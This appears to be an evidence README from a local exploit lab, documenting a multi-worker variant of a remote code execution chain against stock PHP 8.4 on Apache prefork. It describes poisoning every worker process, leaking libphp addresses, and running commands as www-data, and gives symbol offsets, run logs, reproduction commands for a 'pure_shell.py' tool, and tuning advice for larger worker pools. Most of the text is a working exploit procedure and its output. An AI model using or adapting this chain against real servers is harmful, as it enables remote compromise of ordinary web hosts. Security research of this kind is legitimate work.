# Multi-worker PHP2SHELL — evidence

This directory covers the **multi-worker variant** of the same stock target:
`php:8.4.26-apache`, stock `php.ini-production`, but Apache prefork with a
bounded four-worker pool and `KeepAlive On`. The official target profile in
`../..` is still the single-worker `run.sh` target; this is an extension, not
a replacement.

All runs are local Docker targets. No live-target probing was performed.

## 1. Target identity

`target_multi.txt`:

```
container:  p2s-multi-18112 (2ec475412566)
hostname:   2ec475412566
image:      php:8.4.26-apache
image_id:   sha256:60111400ff77bdc44fa79b4f072afe49a42abba71e0846ad496be4761dc9c11a
php:        8.4.26 NTS
apache:     2.4.69 (Debian), prefork
ini:        php.ini-production (display_errors=Off, memory_limit=128M, post_max_size=8M)
pool:       StartServers 4 / MaxRequestWorkers 4 / ServerLimit 4
keepalive:  On
out:        ./multi-out -> /out
```

The image digest and the `libphp.so` are the same as the official target, so
the symbol offsets are unchanged (`zif_system +0x465370`,
`zval_ptr_dtor +0x65eb60`).

## 2. Why the single-worker chain does not directly work

A1/B1 and A2/B2 must share a prefork child because each pair exchanges state
through process-local globals. A1 and A2 always answer `HTTP/1.0 500` with
`Connection: close`, so a keep-alive connection cannot pin the pair. HTTP
pipelining A2+B2 on one connection also fails: A2 closes the stream and the
child discards the pipelined B2.

Evidence:

| File | Result |
|---|---|
| `experiments/keepalive_a1.log` | A1 on a kept-alive socket: `500`, `Connection: close` |
| `experiments/solo_a2.log` | A2 alone: `500`, `Connection: close` |
| `experiments/solo_b1.log` | B1 without A1: no response before headers |
| `experiments/pipeline_1.log` | A2+B2 pipelined: A2 500, B2 `EOF`; no proof |

The strategy is therefore **poison the pool, then let the second request hit
any poisoned child**:

```
A1 wave -> all children carry the stale PS(id)
B1      -> leak from any poisoned child
A2 wave -> all children carry the dangling PS(http_session_vars)
B2      -> execute in any A2-poisoned child
```

A successful B2 usually closes before sending response headers; the proof
file, not the HTTP status, decides success.

## 3. Pool churn and the 8-worker cap

The first multi lab used `MaxRequestWorkers 8`. With four A1s, prefork kept
four children busy and spawned a fifth spare during the OOM churn. The A1
wave hit 19–22; B1 leaked from PID 20; the A2 wave hit 19–22; B2 then landed
on the fresh child PID 32, which had never been poisoned, and returned the
normal 3-byte page. Evidence: `experiments/poison_pid_1.log`,
`access_pids_full.log` (look for `pid=32` on the B2 request).

The same churn is visible in the A2-only run: two waves of 8 A2s covered the
grown pool (PIDs 19, 20, 21, 32), and B2 then executed; the child closed
before headers and the proof appeared. Evidence: `experiments/a2b2_1.log`,
`proof_multi_id_uname.txt`:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Linux 4f898675c501 5.15.153.1-microsoft-standard-WSL2 ... x86_64 GNU/Linux
```

This proved the model: A1 poisoning works; A2 needs enough waves to cover
replacement children.

## 4. Bounded four-worker pool — integrated `--multi`

`docker/apache-multi.conf` now hard-caps the pool:

```
StartServers      4
MinSpareServers   2
MaxSpareServers   4
MaxRequestWorkers 4
ServerLimit       4
```

With the cap, a four-connection A1 wave cannot spawn a fifth child. The
integrated tool run:

```
python3 pure_shell.py --port 18112 --multi --outdir multi-out --exec 'id'
```

produced:

```
[try 1/2] A1 wave 1/1: 4 concurrent, 3/4 500 + 1 transport error
          B1 1/3, 2/3, 3/3: EOF
[try 2/2] A1 wave 1/1: 3/4 500 + 1 transport error
          B1 1/3: decoded=819208
          zval_ptr_dtor=0x7f53f7aa2b60 -> libphp=0x7f53f7444000
          main=0x7f53f5800000 S=0x7f53f58f8398 zif_system=0x7f53f78a9370
          A2 wave: 8 x 2 -> 16/16 500
          B2[1] status=EOF
[+] output (/out/o64bd996b):
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Evidence:

| File | Content |
|---|---|
| `tool_multi_exec_id.log` | full integrated `--multi` run |
| `tool_multi_leak_fixed4.log` | leak-only run on the fixed pool |
| `proof_tool_multi_id.txt` | copied target proof `o64bd996b` |
| `access_pids_fixed4.log` | prefork PIDs for A1/B1/A2/B2 |
| `apache-multi.conf` | exact lab config used |
| `target_multi.txt` | identity, ini, pool, mounts |
| `experiments/poison_pid_1.log` | 8-cap churn: B1 leak, B2 hits new PID 32 |
| `experiments/a2b2_1.log` | 2 x 8 A2 coverage, proof |
| `experiments/pipeline_1.log` | pipelining negative |
| `experiments/keepalive_a1.log` | keep-alive negative |

PID excerpt from `access_pids_fixed4.log` (times UTC):

```
03:30:38-39  A1 x4   pid=49,50,51 (one transport error)
03:31:40     B1      pid=50 200 (leak)
03:31:41     A2 x16  pid=50,51,52
03:31:42     B2      pid=50/51/52 500 (proof written; child aborted)
```

The pool was four at start; the A2 OOM churn killed one child, and the
`MaxRequestWorkers 4` cap kept the survivors at 50,51,52. The 2x8 A2 waves
covered the survivors; B2 executed on one of them.

## 5. Negative control: `--multi` on the official single-worker target

Four A1s on a single child overwrite the same stale state instead of
poisoning four children. The B1 then returns no leak or closes. Log:
`tool_multi_official_single.log`. Use the default single-worker mode for the
official target:

```
python3 pure_shell.py --port 18110 --exec 'id'
```

The regression proof for that path after the `--multi` code changes is
`../proof_single_regression.txt` (`/out/o373671a0`).

## 6. Reproduce

```bash
cd php2shell-lab/official-lab
./run_multi.sh

python3 pure_shell.py --port 18112 --multi --outdir multi-out --exec 'id'
python3 pure_shell.py --port 18112 --multi --leak
```

Defaults for `--multi`: `--a1-workers 4`, `--a1-waves 1`, `--b1-retries 3`,
`--a2-workers 8`, `--a2-waves 2`, `--b2-retries 3`. If the target's pool is
larger than four, raise `--a1-workers` to the pool size so the first wave
covers every child, and keep at least two A2 waves for OOM replacements.

## 7. Limitations

- The multi path is validated on a **bounded four-worker pool**. The A1 wave
  must cover the whole pool; an unbounded or much larger pool needs a larger
  wave and more retries.
- The output channel is still the local `/out` bind mount. Remote delivery
  needs an out-of-band command; TLS is not implemented yet.
- The command limit is unchanged: 200 bytes including the output wrapper,
  so about 154 bytes for the `exec` command.
- A successful B2 often has no HTTP response; the proof file is the only
  reliable success signal.
